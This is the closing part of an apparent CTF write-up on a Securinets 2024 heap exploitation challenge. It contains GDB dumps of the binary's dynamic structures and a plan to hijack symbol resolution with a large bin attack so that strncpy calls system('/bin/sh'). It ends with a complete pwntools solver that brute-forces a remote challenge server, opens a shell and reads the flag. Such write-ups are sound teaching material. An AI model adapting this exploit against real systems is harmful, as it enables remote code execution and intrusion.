<span class="mh">0x555555557ec0</span><span class="p">:</span> <span class="mh">0x0000000000000003</span>      <span class="mh">0x0000555555558000</span>
<span class="mh">0x555555557ed0</span><span class="p">:</span> <span class="mh">0x0000000000000002</span>      <span class="mh">0x00000000000000d8</span>
<span class="mh">0x555555557ee0</span><span class="p">:</span> <span class="mh">0x0000000000000014</span>      <span class="mh">0x0000000000000007</span>
<span class="mh">0x555555557ef0</span><span class="p">:</span> <span class="mh">0x0000000000000017</span>      <span class="mh">0x0000555555554848</span>
<span class="mh">0x555555557f00</span><span class="p">:</span> <span class="mh">0x0000000000000007</span>      <span class="mh">0x0000555555554728</span>
<span class="mh">0x555555557f10</span><span class="p">:</span> <span class="mh">0x0000000000000008</span>      <span class="mh">0x0000000000000120</span>
<span class="mh">0x555555557f20</span><span class="p">:</span> <span class="mh">0x0000000000000009</span>      <span class="mh">0x0000000000000018</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">s</span> <span class="mh">0x00005555555545b0</span>
<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="s">""</span>
<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="s">"__cxa_finalize"</span>
<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="s">"read"</span>
<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="s">"malloc"</span>
<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="s">"__libc_start_main"</span>
<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="s">"setvbuf"</span>
<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="s">"stdout"</span>
<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="s">"puts"</span>
<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="s">"free"</span>
<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="s">"strncpy"</span>
<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="s">"stdin"</span>
<span class="mh">0x555555554605</span><span class="p">:</span> <span class="s">"__isoc99_scanf"</span>
<span class="mh">0x555555554614</span><span class="p">:</span> <span class="s">"stderr"</span>
<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="s">"exit"</span>
<span class="mh">0x555555554620</span><span class="p">:</span> <span class="s">"__stack_chk_fail"</span>
<span class="mh">0x555555554631</span><span class="p">:</span> <span class="s">"printf"</span>
<span class="mh">0x555555554638</span><span class="p">:</span> <span class="s">"libc.so.6"</span>
<span class="mh">0x555555554642</span><span class="p">:</span> <span class="s">"GLIBC_2.7"</span>
<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="s">"GLIBC_2.4"</span>
<span class="mh">0x555555554656</span><span class="p">:</span> <span class="s">"GLIBC_2.34"</span>

</code></pre></div></div>

<p>well we cant overwrite this section as well because it’s r - - . I mean even if we wanted , you the chance of you becoming a millionaire tomorrow is way higher than you getting a PIE leak xD .</p>

<p>So we have to dig deeper into those macros . it turns out that the _dl<em>fixup gets the right pointer inside .dynamic is because there is a pointer in the _link_map</em> structure thats tells it where is the pointer that points to dynstr inside the .dynamic</p>

<p>for debugging purposes , the link<em>map address can be found inside the *_r</em>debug* structure</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="o">&amp;</span><span class="n">_r_debug</span>
<span class="mh">0x7ffff7ffe108</span> <span class="o">&lt;</span><span class="n">_r_debug</span><span class="o">&gt;</span><span class="p">:</span>      <span class="mh">0x0000000000000001</span>      <span class="mh">0x00007ffff7ffe2c0</span>
<span class="mh">0x7ffff7ffe118</span> <span class="o">&lt;</span><span class="n">_r_debug</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x00007ffff7fcd510</span>      <span class="mh">0x0000000000000000</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x00007ffff7ffe2c0</span>
<span class="mh">0x7ffff7ffe2c0</span><span class="p">:</span> <span class="mh">0x0000555555554000</span>      <span class="mh">0x00007ffff7ffe888</span>
<span class="mh">0x7ffff7ffe2d0</span><span class="p">:</span> <span class="mh">0x0000555555557df0</span>      <span class="mh">0x00007ffff7ffe890</span>
<span class="mh">0x7ffff7ffe2e0</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00007ffff7ffe2c0</span>
<span class="mh">0x7ffff7ffe2f0</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x00007ffff7ffe870</span>
<span class="mh">0x7ffff7ffe300</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000555555557df0</span>
<span class="mh">0x7ffff7ffe310</span><span class="p">:</span> <span class="mh">0x0000555555557ed0</span>      <span class="mh">0x0000555555557ec0</span>
<span class="mh">0x7ffff7ffe320</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000555555557e70</span>
<span class="mh">0x7ffff7ffe330</span><span class="p">:</span> <span class="mh">0x0000555555557e80</span>      <span class="mh">0x0000555555557f00</span>
<span class="mh">0x7ffff7ffe340</span><span class="p">:</span> <span class="mh">0x0000555555557f10</span>      <span class="mh">0x0000555555557f20</span>
<span class="mh">0x7ffff7ffe350</span><span class="p">:</span> <span class="mh">0x0000555555557e90</span>      <span class="mh">0x0000555555557ea0</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">gx</span> <span class="mh">0x0000555555557e70</span>
<span class="mh">0x555555557e70</span><span class="p">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00005555555545b0</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">s</span> <span class="mh">0x00005555555545b0</span>
<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="s">""</span>
<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="s">"__cxa_finalize"</span>
<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="s">"read"</span>
<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="s">"malloc"</span>
<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="s">"__libc_start_main"</span>
<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="s">"setvbuf"</span>
<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="s">"stdout"</span>
<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="s">"puts"</span>
<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="s">"free"</span>
<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="s">"strncpy"</span>
<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="s">"stdin"</span>
<span class="mh">0x555555554605</span><span class="p">:</span> <span class="s">"__isoc99_scanf"</span>
<span class="mh">0x555555554614</span><span class="p">:</span> <span class="s">"stderr"</span>
<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="s">"exit"</span>
<span class="mh">0x555555554620</span><span class="p">:</span> <span class="s">"__stack_chk_fail"</span>
<span class="mh">0x555555554631</span><span class="p">:</span> <span class="s">"printf"</span>
<span class="mh">0x555555554638</span><span class="p">:</span> <span class="s">"libc.so.6"</span>
<span class="mh">0x555555554642</span><span class="p">:</span> <span class="s">"GLIBC_2.7"</span>
<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="s">"GLIBC_2.4"</span>
<span class="mh">0x555555554656</span><span class="p">:</span> <span class="s">"GLIBC_2.34"</span>
<span class="n">gef</span><span class="err">➤</span>  <span class="n">vmmap</span> <span class="mh">0x7ffff7ffe2c0</span>
<span class="p">[</span> <span class="n">Legend</span><span class="p">:</span>  <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="p">]</span>
<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
<span class="mh">0x00007ffff7ffd000</span> <span class="mh">0x00007ffff7fff000</span> <span class="mh">0x0000000000032000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>

</code></pre></div></div>

<p>yes that value will be our target for the large bin attaque . we will forge a new pointers chain so that when a function gets resolved , it will have the ‘system’ function gets called . but what is this function ??</p>

<p>Do you remember the weird <em>COPY_RULES()</em> function ? . it calls the <em>stncpy</em> function with a pointer that we can put “/bin/sh” inside it using the <em>edit()</em> function .
so when it gets called , what actually gets called is system(“/bin/sh”).</p>

<h1 id="plan">PLAN</h1>

<ol>
  <li>setup the heap for our large bin attaque</li>
  <li>we swap a libc pointer into the <em>bk_nextsize</em> then paritally overwrite it to be at &amp;link_map + 0x68 - 0x20 (we brute force the third lowest byte) .</li>
  <li>now lets suppose 0x1000 is the heap pointer written where we wanted , we need to write another heap pointer in 0x1008 as this will be the pointer to the forged <em>dynstr</em> section .</li>
  <li>one unfortunate thing is that the heap value written is malloc()-0x10 , so we cant just use <em>link_rules()</em> to put a heap value there . For that we need to get back to step 1 and have some more heap setups .
What i did was i prepared a chunk at 0x1000-0x10 to be freed and put into unsorted bin when i need it to , and have a heap pointer . you will see some spraying in my solver because things got so messy .</li>
  <li>
    <p>once all of this is done , just calculate the offset of the string ‘strncpy’ from the beggining of the strtab and forge your own in the pointer you wrote in step 4 . in our case its 0x47 .</p>
  </li>
  <li>write “/bin/sh” in some chunk then use the copy_rule on it . So instead of strncpy(“/bin/sh”,…) »» system(“/bin/sh”) gets called .</li>
</ol>

<h1 id="conclusion">Conclusion</h1>

<p>it was a very unique heap challenge , although the bruteforcing on remote took a toll on me as i had no way of debugging (no output in the whole program xD) .
It pushed me to my limits and i ended up learning a lot . Kudos to the author Mongi . the solver below might be very non-chalant to you but whatever gets the job done .</p>

<p>if you reached this point , hope you had a great and informative read .</p>

<h1 id="solver">solver</h1>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
                        x/40gx &amp;rules
                        b* copy_rule+275
                        '''</span><span class="p">)</span>
<span class="c1">###############   files setup   ###############
</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">nc</span><span class="o">=</span><span class="s">"nc 34.165.180.62 5001"</span>
<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1">############### remote or local ###############
</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>

<span class="c1">############### helper functions ##############
</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
        <span class="k">pass</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>   <span class="c1"># between 0x500 and 0x800
</span>        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">setin</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload1</span><span class="p">:</span><span class="nb">bytes</span><span class="p">,</span><span class="n">payload2</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"7"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setout</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload1</span><span class="p">:</span><span class="nb">bytes</span><span class="p">,</span><span class="n">payload2</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"8"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">link</span><span class="p">(</span><span class="n">rule1</span><span class="p">,</span><span class="n">rule2</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rule1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rule2</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">newline</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">if</span> <span class="n">newline</span><span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1">############### main exploit    ###############
#p.close()
</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>

        <span class="k">try</span> <span class="p">:</span>
                <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
                <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your ID: "</span><span class="p">)</span>
                <span class="n">leak</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
                <span class="n">guess</span><span class="o">=</span><span class="p">(</span><span class="n">leak</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x328</span><span class="o">+</span><span class="mh">0x9000</span><span class="o">+</span><span class="mh">0x5d0000</span>
                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">guess</span><span class="p">))</span>


                <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># vuln
</span>                <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"system</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

                <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

                <span class="n">malloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
                <span class="n">malloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>  <span class="c1"># this one overwrites smaller-0x10
</span>

                <span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
                <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span> <span class="c1"># for consolidation
</span>                <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x510</span><span class="p">)</span>  <span class="c1"># smaller
</span>
                <span class="n">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1">#for consolidation
</span>                <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x300</span><span class="o">//</span><span class="mi">16</span><span class="p">))</span>

                <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
                <span class="n">malloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 0 to large bin
</span>
                <span class="n">link</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
                <span class="c1">#guess=b""
</span>                <span class="n">setout</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">guess</span><span class="p">)[:</span><span class="mi">3</span><span class="p">])</span>


                <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                <span class="c1">#debug()
</span>                <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span> <span class="c1"># to push 1 to large bin
</span>
                <span class="n">malloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x800</span><span class="p">)</span>  <span class="c1"># just to free 10 later
</span>

                <span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="mh">0x800</span><span class="o">//</span><span class="mi">16</span><span class="p">),</span><span class="bp">True</span><span class="p">)</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x701</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"a"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
                <span class="c1">#pause()
</span>                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
                <span class="n">link</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>

                <span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x47</span><span class="o">-</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"system</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="c1">#pause()
</span>
                <span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="s">"/bin/sh</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>

                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"10"</span><span class="p">)</span>
                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"7"</span><span class="p">)</span>

                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="c1">#p.interactive()
</span>                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"ls / ; cat /fla*"</span><span class="p">)</span>
                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                <span class="n">msg</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------"</span><span class="p">)</span>
                <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------"</span><span class="p">)</span>
                <span class="k">if</span> <span class="sa">b</span><span class="s">"app"</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
                        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

                <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

        <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"bye"</span><span class="p">)</span>
                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">except</span> <span class="p">:</span>
                <span class="k">pass</span>
        <span class="k">finally</span> <span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

</code></pre></div></div>

<p><img src="/assets/posts/Securinets_quals_2024/flag.png" alt="flag" /></p>

</article>

            </main><footer>
    <div class="window-container">
        <div class="window">
            <div class="contacts">
                <p><a href="https://github.com/buddurid">Github</a></p>
                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
                <p><a href="https://x.com/buddurid">Twitter</a></p>
                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
                <p><a href="">Discord:#buddurid</a></p>
                <p><a href="">CTFTime</a></p>
            </div>
            <p>©2024    Buddurid</p>
            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
        </div>
    </div>
    <script src="/assets/footer-fix.js"></script>
</footer>
</div>
    </body>
</html>